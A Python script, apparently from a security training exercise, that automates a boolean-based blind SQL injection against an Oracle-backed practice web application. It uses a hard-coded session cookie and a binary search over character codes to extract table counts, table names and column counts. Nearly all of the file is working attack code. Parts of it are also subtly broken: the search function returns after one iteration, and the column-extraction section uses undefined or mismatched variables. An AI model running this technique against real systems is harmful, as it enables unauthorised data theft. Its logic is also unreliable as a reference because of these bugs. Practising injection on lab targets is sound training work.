import requests

urlBase = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}"

jsession = {"JSESSIONID":"29D8E30685DA28EC9B2668F215E37F8E"}
contype ={"Content-Type": "application/x-www-form-urlencoded"}
#querybase = "(select count(table_name) from user_tables) > {}"

def binarySearch(queryBase):
    min = 1
    max = 127
    queryBase = queryBase + " > {}"
    while min != max:
        avg = int((min + max) /2)
        query = queryBase.format(avg)
        url = urlBase.format(query)
        res = requests.get(url,cookies=jsession)
        if "MacBook" in res.text:
            min = avg +1
        else:
            max = avg
        return min
#query = input("쿼리문 >")
#lengthQuery="(select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum=1)>{}"
#select count(table_name) from user_tables)
queryBase="(select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum = 1) > {}"

countQuery="(select count(table_name) from user_tables)"
countResult =binarySearch(countQuery)
print("테이블 수: "+str(countResult))
#lengthResult =binarySearch(lengthQuery)
#print("첫 테이블의 개수 : "+lengthResult)

for i in range(1,countResult +1):
    lengthquery="(select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum={})".format(i)
    lengthresult=binarySearch(lengthquery)
    print("{}번째 테이블의 문자열 길이 : {}개".format(i,lengthresult))
    table_name=""
    for j in range(1, lengthresult+1):
        substrQuery="(select ascii(substr(table_name, {})) from (select table_name, rownum as rnum from user_tables) where rnum={})".format(j,i)
        asciiSubstr = binarySearch(substrQuery)
        table_name=table_name + chr(asciiSubstr)
        print("{}번째 테이블 명 : {}".format(i,table_name))
        columnCountQuery="(select count(column_name) from all_tab_columns where table_name = '{}')".format(table_name)
        columnCountResult = binarySearch(columnCountQuery)
        print("{}번째 테이블인 {} 테이블의 컬럼의 개수: {}개".format(i,table_name,columnCountResult))


lengthColumn="(select length(column_name) from (select column_name, rownum as rnum from all_tab_columns) where table_rnum = '{}')".format(i)
lengthresult=binarySearch(lengthquery)
for j in range(1, lengthresult+1):
    substrQuery="(select ascii(substr(table_name, {})) from (select table_name, rownum as rnum from user_tables) where rnum={})".format(j,i)
    asciiSubstr = binarySearch(substrQuery)
    table_name=table_name + chr(asciiSubstr)
#querybase = "(select ascii(substr(user, {}, 1)) from dual) = {}"
# for pos in range(1,9):
# min = 1
# max=127
# while min != max:
# avg = int((min + max) /2)
# queryurl = url + querybase.format(pos,avg)
# res = requests.get(queryurl, cookies=cookies)
# count =count +1
# if "MacBook" in res.text:
# min = avg +1
# else:
# max = avg
# user += chr(min)
# print("유저명: "+ user)